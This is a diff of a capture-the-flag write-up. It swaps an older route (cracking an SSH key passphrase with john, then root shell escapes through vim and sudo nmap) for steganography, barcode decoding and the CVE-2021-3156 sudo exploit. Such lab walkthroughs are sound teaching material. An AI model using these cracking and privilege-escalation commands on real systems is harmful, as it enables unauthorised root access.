@@ -21,48 +21,47 @@ gobuster dir -u <MACHINE_IP> -w /usr/share/wordlists/dirb/big.txt
 
 Go to secter
 
-![rsa](images/rsa.png)
+![secret](images/secret.png)
 
-Name of file -- login to ssh, secret -- key to login ssh
-
-Brute password for id_rsa
+Download image, and use steghide
 
 ```bash
-ssh2john id_rsa > hash.txt
-john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt
+steghide extract -sf find.jpg
 ```
 
-![key](images/key.png)
+![steghide](images/steghide.png)
 
-Login ssh 
+Go to imgur
 
-![login](images/login.png)
+![imgur](images/imgur.png)
 
-Cat user.txt
-
-![user](images/user.png)
-
-Decode user.txt
+Download barcode, and [decode](https://zxing.org/w/decode.jspx)
 
 ![decode](images/decode.png)
 
-Check sudo 
+Login ssh with this data
+
+![user](images/user.png)
+
+Use [CVE-2021-3156 PoC by blasty](https://github.com/blasty/CVE-2021-3156) for PrivEsc
+
+![httpserver](images/httpserver.png)
+
+![download](images/download.png)
+
+Compile the exploit
+
+```
+cd exploit
+make
+```
+
+![make](images/make.png)
+
+Run the exploit
 
 ![sudo](images/sudo.png)
 
-Use nmap or vim for PrivEsc. [GTFObins](https://gtfobins.github.io/)
-
-```bash
-vim
-:!/bin/bash
-```
-
-```bash
-TF=$(mktemp)
-echo 'os.execute("/bin/sh")' > $TF
-sudo nmap --script=$TF
-```
-
-Cat root.txt
+Capture the flag
 
 ![root](images/root.png)
